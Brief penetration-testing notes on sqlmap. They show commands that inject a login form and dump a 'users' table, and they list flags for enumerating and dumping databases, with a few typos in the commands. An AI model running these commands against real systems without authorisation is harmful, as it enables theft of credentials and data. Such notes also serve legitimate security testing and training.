User-defined functions
=> https://redteamnation.com/mysql-user-defined-functions/

SQLMap
Try injecting a form

```bash
# try login.php
sqlmap -u URL/login.php
```

Try dumping the table "users" in the database "db_name"

```bash
$ sqlmap -u UGL/login.php -D db_name -T users -–dump
```

Notes

* Try both with, and without union tests
* `XXX xxx is vulnerable`: enter yes to try exploiting this parameter
* `-u URL`: try injecting this URL
* `--dbs`: display all databases
* `--tables`: display tables
* `--column`: display columns
* `-C xx, yy`: display only columns xx, and yy
* `--dbms=some_dbms`: provide dbms, increase the chances of success
* `-D db_name`: the name of the database
* `--time-sec timeout`: specify a timeout
* `--dump`: save current data
* `--dump-all`: save all data
* `--batch`: do all requests at once (do not way for input)